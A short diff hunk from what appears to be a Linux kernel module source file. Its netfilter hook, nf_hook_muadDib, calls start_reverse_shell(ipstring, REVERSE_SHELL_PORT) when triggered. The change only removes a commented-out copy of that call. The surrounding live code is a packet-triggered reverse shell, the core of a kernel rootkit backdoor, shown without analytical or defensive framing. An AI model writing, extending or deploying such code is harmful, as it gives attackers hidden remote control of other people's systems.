@@ -45,8 +45,6 @@ static unsigned int nf_hook_muadDib(void *priv, struct sk_buff *skb, const struc
 		start_reverse_shell(ipstring, REVERSE_SHELL_PORT);
 	}
 	
-	//start_reverse_shell(ipstring, REVERSE_SHELL_PORT)
-	
 
 	return NF_ACCEPT;	
 	
